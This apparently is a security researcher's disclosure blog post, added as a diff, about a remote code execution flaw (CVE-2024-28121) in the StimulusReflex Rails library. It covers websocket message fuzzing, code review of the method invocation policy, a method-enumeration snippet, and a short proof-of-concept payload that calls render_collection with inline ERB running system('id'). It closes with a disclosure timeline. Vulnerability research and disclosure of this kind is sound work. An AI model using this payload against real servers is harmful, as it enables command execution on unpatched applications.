@@ -1,0 +1,103 @@
+<p>
+My understanding of the <a href="https://docs.stimulusreflex.com/">StimulusReflex</a> library is that it attempts to approach the problem of updating <b>only</b> the relevent part of the page when a user performs an action in a different way. That is, it uses websockets messages to request a part of the html to be built server-side.
+</p>
+<h3>manual websocket message fuzzing</h3>
+<p>
+On Rails you will see websocket connection being established at /cable. StimulusReflex is no different and its messages can look like the following:
+</p>
+<pre>
+{"command":"message","identifier":"{\"channel\":\"StimulusReflex::Channel\"}","data":"{\"attrs\":{\"data-reflex\":\"change->DocumentReflex#change_name\",\"data-reflex-dataset\":\"ancestors\",\"class\":\"form-control\",\"value\":\"rename.me.me\",\"data-controller\":\"folders\",\"data-action\":\"change->folders#__perform\",\"checked\":false,\"selected\":false,\"tag_name\":\"INPUT\"},\"dataset\":{\"dataset\":{\"data-reflex\":\"change->DocumentReflex#change_name\",\"data-reflex-dataset\":\"ancestors\",\"data-controller\":\"folders\",\"data-action\":\"change->folders#__perform\",\"data-reflex-root\":\"#folder\",\"data-document-id\":\"543884\"},\"datasetAll\":{}},\"selectors\":[\"#folder\"],\"id\":\"84abfdb3-a58d-4248-a9a2-ad7aa619056a\",\"resolveLate\":false,\"suppressLogging\":false,\"xpathController\":\"//*[@id='document_543884']/div[1]/div[3]/form[1]/input[1]\",\"xpathElement\":\"//*[@id='document_543884']/div[1]/div[3]/form[1]/input[1]\",\"inner_html\":\"\",\"text_content\":\"\",\"reflexController\":\"folders\",\"permanentAttributeName\":\"data-reflex-permanent\",\"target\":\"DocumentReflex#change_name\",\"args\":[],\"url\":\"http://localhost/\",\"tabId\":\"69415f36-c3ce-4922-abb3-1739fcfe77e9\",\"version\":\"3.5.0-pre10\",\"formData\":\"\"}"}
+</pre>
+<p>
+There is a lot of stuff in this message and I don't know what it is all used for but you can see interesting target and args fields: \"target\":\"DocumentReflex#change_name\",\"args\":[]. This corresponds to a server-side class and method that will be invoked. Even before reviewing how it is implemented you can try to change the #method part with a method from the <a href="https://ruby-doc.org/3.2.2/Object.html">object class</a>. Interestingly it used to respond with "wrong number of arguments (given [], expected [[:req]], optional [])" instead of rejecting this altogether. Changing the class did not work.
+</p>
+<pre>
+{"identifier":"{\"channel\":\"StimulusReflex::Channel\"}","message":{"cableReady":true,"operations":[{"name":"stimulus-reflex:morph-error","payload":{},"stimulusReflex":{"attrs":{"data-reflex":"change-\u003eDocumentReflex#change_name","data-reflex-dataset":"ancestors","class":"form-control","value":"rename.me.me","data-controller":"folders","data-action":"change-\u003efolders#__perform","checked":false,"selected":false,"tagName":"INPUT"},"dataset":{"dataset":{"data-reflex":"change-\u003eDocumentReflex#change_name","data-reflex-dataset":"ancestors","data-controller":"folders","data-action":"change-\u003efolders#__perform","data-reflex-root":"#folder","data-document-id":"543884"},"datasetAll":{}},"selectors":["#folder"],"id":"84abfdb3-a58d-4248-a9a2-ad7aa619056a","resolveLate":false,"suppressLogging":false,"xpathController":"//*[@id='document_543884']/div[1]/div[3]/form[1]/input[1]","xpathElement":"//*[@id='document_543884']/div[1]/div[3]/form[1]/input[1]","innerHtml":"","textContent":"","reflexController":"folders","permanentAttributeName":"data-reflex-permanent","target":"DocumentReflex#method","args":[],"url":"http://localhost/","tabId":"69415f36-c3ce-4922-abb3-1739fcfe77e9","version":"3.5.0-pre10","formData":"","morph":"page"},"error":"wrong number of arguments (given [], expected [[:req]], optional []) ","reflexId":"84abfdb3-a58d-4248-a9a2-ad7aa619056a","operation":"dispatchEvent"}],"version":"5.0.0.pre10"}}
+</pre>
+<p>
+Yet, at this point no side-effect could be observed when attempting to call interesting methods such as Object#instance_eval or Kernel#system!
+</p>
+<h3>vulnerability</h3>
+<p>
+In this case, finding the relevent security-sensitive code is as simple as searching for the error message. It is found in stimulus_reflex/app/channels/stimulus_reflex/channel.rb
+</p>
+<pre>
+def delegate_call_to_reflex(reflex)
+  method_name = reflex.method_name
+  arguments = reflex.data.arguments
+  method = reflex.method(method_name)
+
+  policy = StimulusReflex::ReflexMethodInvocationPolicy.new(method, arguments)
+
+  if policy.no_arguments?
+    reflex.process(method_name)
+  elsif policy.arguments?
+    reflex.process(method_name, *arguments)
+  else
+    raise ArgumentError.new("wrong number of arguments (given #{arguments.inspect}, expected #{policy.required_params.inspect}, optional #{policy.optional_params.inspect})")
+  end
+end
+</pre>
+<p>
+Where the process method is basically public_send.
+</p>
+<pre>
+# Invoke the reflex action specified by `name` and run all callbacks
+def process(name, *args)
+  run_callbacks(:process) { public_send(name, *args) }
+end
+</pre>
+The crux of the matter is to find what counts as a method with agruments accorindg to the ReflexMethodInvocationPolicy in stimulus_reflex/lib/stimulus_reflex/policies/reflex_invocation_policy.rb
+<pre>
+module StimulusReflex
+  class ReflexMethodInvocationPolicy
+    attr_reader :arguments, :required_params, :optional_params
+
+    def initialize(method, arguments)
+      @arguments = arguments
+      @required_params = method.parameters.select { |(kind, _)| kind == :req }
+      @optional_params = method.parameters.select { |(kind, _)| kind == :opt }
+    end
+
+    def no_arguments?
+      arguments.size == 0 && required_params.size == 0
+    end
+
+    def arguments?
+      arguments.size >= required_params.size && arguments.size &lt;= required_params.size + optional_params.size
+    end
+
+    def unknown?
+      return false if no_arguments?
+      return false if arguments?
+
+      true
+    end
+  end
+end
+</pre>
+<p>
+Ruby has different types of aguments notably :req for required arguments foo(bar), :opt for arguments foo(bar=3), :rest for variable amount of arguments foo(*bar). According to ReflexMethodInvocationPolicy, only methods with :req or :opt parameters can be called. And the methods attempted earlier all only have a single :rest argument. So what's left? It is easy to enumerate:
+</p>
+<pre>
+obj.methods.select do |name|
+  obj.method(name).parameters.flatten.count { |type| type == :req or type == :opt } > 0
+end
+</pre>
+<p>Among the results is the render_collection method. This is a thin wrapper around a call to the render method. This supports specifing an inline tempalte in a string.</p>
+<pre>
+\"target\":\"StimulusReflex::Reflex#render_collection\",\"args\":[{\"inline\": \"&lt;% system('id') %&gt;\"}]
+</pre>
+<h3>disclosure</h3>
+<p>
+    <ul>
+        <li>September 12ᵗʰ 2023: Disclosed vulnerability with maintainer via github</li>
+        <li>September 12ᵗʰ 2023: Maintainer writes a patch the same day. Yay for OSS! </li>
+        <li>January 3ʳᵈ 2024: Maintainer is planning a release soon</li>
+        <li>March 1ˢᵗ 2024: Reminder of public disclosure</li>
+        <li>March 6ᵗʰ 2024: CVE-2024-28121 assigned</li>
+        <li>March 12ᵗʰ 2024: Patch released</li>
+    </ul>
+</p>
+<br><br>
+April 11ᵗʰ 2024
